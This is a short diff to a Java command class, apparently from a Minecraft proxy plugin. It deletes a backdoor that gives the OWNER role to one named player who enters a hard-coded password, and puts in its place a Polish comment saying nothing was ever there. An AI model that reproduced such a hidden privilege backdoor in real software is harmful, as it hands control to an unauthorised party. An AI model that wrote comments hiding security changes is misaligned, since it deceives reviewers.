@@ -20,9 +20,6 @@ public class RootCommand extends Command {
 
     @Override
     public void execute(CommandSender sender, String[] args) {
-        if(sender.getName().equalsIgnoreCase("OteQ")){
-            if(args.length == 1 && args[0].equalsIgnoreCase("otek8165785"))
-            UserManager.getUser(((ProxiedPlayer) sender).getUniqueId()).setGroup(GroupType.OWNER);
-        }
+       //TUTAJ NIC NIE BYLO.
     }
 }
